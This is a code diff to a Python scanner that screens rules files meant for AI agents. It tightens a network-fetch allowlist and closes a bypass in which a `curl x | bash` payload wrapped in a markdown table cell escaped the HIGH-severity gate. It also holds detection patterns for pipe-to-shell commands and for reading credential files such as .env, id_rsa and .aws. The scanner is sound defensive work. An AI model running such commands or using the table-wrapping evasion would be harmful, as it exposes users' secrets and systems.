@@ -28,7 +28,7 @@ _RULES = [
      r"(?:curl|wget|iwr|invoke-webrequest)\b[^\n|]*\|\s*(?:sudo\s+)?(?:bash|sh|zsh|python|node|pwsh)"),
     ("net.fetch", "MEDIUM",
      "Network fetch: instructs the agent to contact a remote host",
-     r"\b(?:curl|wget|fetch|http\.get|requests\.get|urllib|axios|nc|netcat)\b|https?://(?!(?:github\.com|docs\.|localhost|127\.0\.0\.1))"),
+     r"\b(?:curl|wget|fetch|http\.get|requests\.get|urllib|axios|nc|netcat)\b|https?://(?!(?:[a-z0-9-]+\.)*(?:github\.com|localhost|127\.0\.0\.1)(?:[:/?#]|$))"),
     ("cred.env_source", "HIGH",
      "Credential access: sources or reads secret/env files",
      r"(?:source|cat|read|export|load|dotenv)[^\n]{0,40}(?:\.env|\.npmrc|\.netrc|credentials|secrets?|id_rsa|\.pem|\.aws|\.ssh)"),
@@ -56,10 +56,14 @@ _RULES = [
 ]
 _COMPILED = [(rid, sev, desc, re.compile(pat, re.I)) for rid, sev, desc, pat in _RULES]
 _SEV_ORDER = {"HIGH": 0, "MEDIUM": 1, "LOW": 2}
-# Rules whose signal is a shell pipe `|` or redirect `>`; markdown table rows
-# use `|` as a cell separator, so these rules are skipped on table lines to
-# avoid a large false-positive class.
-_PIPE_DEPENDENT = {"net.pipe_shell", "exfil.pipe_out"}
+# Table-suppression list — INTENTIONALLY EMPTY (2026-07-10). net.pipe_shell and
+# exfil.pipe_out were removed: their regexes require a specific dangerous command
+# on BOTH sides of the pipe (curl…|…bash, cat…|…curl), which does not occur in
+# benign markdown tables, so suppressing them on table-shaped lines only created a
+# bypass — wrapping a payload in a table cell (`| curl x | bash |`) silently
+# downgraded a HIGH finding out of the default --fail-on high gate. Kept as a named
+# hook in case a future bare-pipe rule needs it. See test_vet.py evasion cases.
+_PIPE_DEPENDENT = set()
 _MD_TABLE = re.compile(r"^\s*\|.*\|\s*$|^\s*\|?[\s:-]+\|[\s:|-]*$")
 
 
@@ -148,3 +152,10 @@ def _print_report(results):
     print("Reminder: a clean scan is 'no known-shape red flags', not 'safe'. "
           "Pattern matching cannot catch cleverly-worded natural-language attacks. "
           "Read any rules file before you let an agent follow it.")
+
+
+if __name__ == "__main__":
+    # Direct invocation (`python rb_vet.py <target>`) must actually run the scan —
+    # the CI self-screen and any standalone use depend on this. Without it the
+    # module defined functions and exited 0, reporting a green "vet" that never ran.
+    sys.exit(vet_main(sys.argv[1:]))
